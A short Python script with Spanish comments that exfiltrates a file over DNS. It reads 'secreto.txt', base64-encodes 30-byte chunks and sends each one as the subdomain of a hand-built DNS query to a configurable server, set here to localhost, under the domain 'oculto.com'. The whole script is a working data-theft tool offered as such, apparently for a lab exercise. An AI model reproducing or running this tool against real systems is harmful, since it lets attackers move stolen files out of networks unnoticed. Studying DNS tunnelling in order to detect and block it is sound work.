import socket
import base64
import random
import time

# Datos de archivo a enviar
ARCHIVO = "secreto.txt" # documento a enviar por dns
SERVER_DNS = "127.0.0.1"
PORT = 53 # puerto DNS
DOMINIO = "oculto.com" #Dominio
SESION_ID = "1"
TAMANIO_FRAGMENTO = 30 # tamaño del paquete DNS
RETARDO = 0.5 #Tiempo entre envío de paquetes

# Funcion para enviar consultas DNS
def enviar_fragmento(nombre_dominio):
    try:
        transaccion_id = random.randint(0, 65535) # el id de la transacción
        flags = 0x0100 # bandera de una consulta DNS 
        preguntas = 1
        respuesta_rrs = autoridad_rrs = adicionales_rrs = 0

        # Cabecera DNS
        # Creamos la cabecera standard DNS, canvertimos los campos a 2 bytes.
        header = transaccion_id.to_bytes(2, 'big') + \
                 flags.to_bytes(2, 'big') + \
                 preguntas.to_bytes(2, 'big') + \
                 respuesta_rrs.to_bytes(2, 'big') + \
                 autoridad_rrs.to_bytes(2, 'big') + \
                 adicionales_rrs.to_bytes(2, 'big')
        
        # Pregunta : codificar el nombre como formato DNS
        qname = b''.join(len(p).to_bytes(1, 'big') + p.encode() for p in nombre_dominio.split('.')) + b'\x00' # Dns requiere que el nombre se codifique con el largo del paquete
        qtype = (1).to_bytes(2, 'big')   # A record
        qclass = (1).to_bytes(2, 'big')  # IN (Internet)
        
        # Combinar todo en un paquete
        pregunta = qname + qtype + qclass
        paquete = header + pregunta

        # Enviar por UDP
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(paquete, (SERVER_DNS, PORT))

    except Exception as e:
        print(f"[!] Error enviando {nombre_dominio}: {e}")


# exfiltrar archivo

def exfiltrar_archivo():
    with open(ARCHIVO, "rb") as f:
        contenido = f.read()

    # Fragmentar y codificar
    for i in range(0, len(contenido), TAMANIO_FRAGMENTO):
        fragmento = contenido[i:i+TAMANIO_FRAGMENTO]
        b64_fragmento = base64.b64encode(fragmento).decode().replace("=", "")  # eliminamos "=" por compatibilidad DNS

        dominio = f"{b64_fragmento}.{SESION_ID}.{DOMINIO}"
        print(f"[+] Enviando: {dominio}")
        enviar_fragmento(dominio)
        time.sleep(RETARDO)

    print("[*] Exfiltración terminada.")


if __name__ == "__main__":
    exfiltrar_archivo()
